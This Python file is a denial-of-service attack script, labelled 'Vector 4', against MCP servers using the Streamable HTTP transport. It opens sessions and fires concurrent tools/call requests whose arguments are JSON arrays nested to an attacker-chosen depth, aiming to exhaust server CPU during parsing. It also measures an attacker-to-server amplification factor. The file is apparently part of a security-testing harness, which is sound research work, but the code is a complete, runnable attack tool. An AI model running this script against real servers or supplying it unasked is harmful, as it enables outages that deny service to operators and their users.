"""
Vector 4 -- Deeply nested JSON (CWE-770), Streamable HTTP transport.

Sends `concurrency` concurrent tools/call requests, each carrying a
JSON value nested `depth` levels deep (a chain of single-element arrays).
The nested value doesn't need to type-check against the target tool's
schema -- the resource cost this vector targets happens during body
parsing, before any tool-schema validation runs.

Reports how cheap this is for the attacker to build (`build_s`, per
payload) alongside the usual send/ok/failed counters, so the driver can
compute a CPU-channel amplification factor (server CPU-seconds consumed
per attacker CPU-second spent constructing the payload).

Usage: python attack.py <base_url> <depth> <concurrency> [timeout_s]
"""
from __future__ import annotations

import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import httpx


def initialize(base_url: str) -> str | None:
    body = {
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                   "clientInfo": {"name": "attacker", "version": "1.0"}},
    }
    with httpx.Client(timeout=10.0) as c:
        r = c.post(f"{base_url}/mcp", json=body,
                   headers={"Accept": "application/json, text/event-stream"})
        sid = r.headers.get("mcp-session-id")
        if sid:
            c.post(f"{base_url}/mcp",
                   json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                   headers={"mcp-session-id": sid, "Accept": "application/json, text/event-stream"})
        return sid


def send_one(base_url: str, raw_body: bytes, timeout_s: float):
    # own session per worker -- see vector 1's attack.py for why
    sid = initialize(base_url)
    if not sid:
        return "error:init_failed"
    headers = {"mcp-session-id": sid, "Accept": "application/json, text/event-stream",
               "Content-Type": "application/json"}
    try:
        with httpx.Client(timeout=timeout_s) as c:
            r = c.post(f"{base_url}/mcp", content=raw_body, headers=headers)
            return r.status_code
    except httpx.HTTPError as e:
        return f"error:{type(e).__name__}"


def main():
    base_url = sys.argv[1]
    depth = int(sys.argv[2])
    concurrency = int(sys.argv[3])
    timeout_s = float(sys.argv[4]) if len(sys.argv) > 4 else 15.0

    t_build0 = time.perf_counter()
    nested = "[" * depth + "]" * depth
    # splice the raw nested-array text in as the "text" argument's value
    # (deliberately not JSON-string-escaped -- it's valid JSON on its own,
    # just not a string, which is exactly why it exercises the parser
    # without ever reaching tool-argument validation)
    raw_body = (
        b'{"jsonrpc":"2.0","id":2,"method":"tools/call","params":'
        b'{"name":"echo","arguments":{"text":' + nested.encode() + b'}}}'
    )
    build_s = (time.perf_counter() - t_build0) / max(concurrency, 1)  # per-request share

    sent_bytes = len(raw_body) * concurrency

    t0 = time.perf_counter()
    results = []
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futs = [ex.submit(send_one, base_url, raw_body, timeout_s) for _ in range(concurrency)]
        for f in futs:
            results.append(f.result())
    elapsed = time.perf_counter() - t0

    ok = sum(1 for r in results if r == 200)
    failed = concurrency - ok
    print(json.dumps({"sent_bytes": sent_bytes, "ok": ok, "failed": failed,
                       "elapsed_s": elapsed, "build_s": build_s,
                       "statuses": [str(r) for r in results]}))


if __name__ == "__main__":
    main()
